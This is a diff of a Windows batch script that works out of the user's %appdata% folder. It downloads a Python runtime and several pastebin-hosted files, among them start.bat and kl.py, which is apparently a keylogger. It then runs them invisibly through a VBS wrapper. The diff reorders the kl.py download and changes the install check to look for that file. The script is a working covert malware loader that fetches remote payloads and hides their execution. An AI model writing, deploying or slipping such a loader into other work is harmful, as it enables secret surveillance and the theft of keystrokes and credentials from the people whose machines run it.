@@ -2,7 +2,7 @@ echo off
 cls
 cd %appdata%
 
-if exist python\start.bat (
+if exist python\kl.py (
 	cd python
 	wscript.exe "%appdata%/invisible.vbs" "start.bat"
 ) else (
@@ -12,7 +12,6 @@ if exist python\start.bat (
 	tar -xf python.zip
 	powershell -Command "Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -Outfile get-pip.py"
 	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/dzRvGa3K -Outfile python310._pth"
-	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile kl.py"
 	python.exe get-pip.py
 	cd Scripts
 	pip install requests
@@ -20,5 +19,6 @@ if exist python\start.bat (
 	cd %appdata%
 	cd python
 	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile start.bat"
+	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile kl.py"
 	wscript.exe "%appdata%/invisible.vbs" "start.bat"
 )
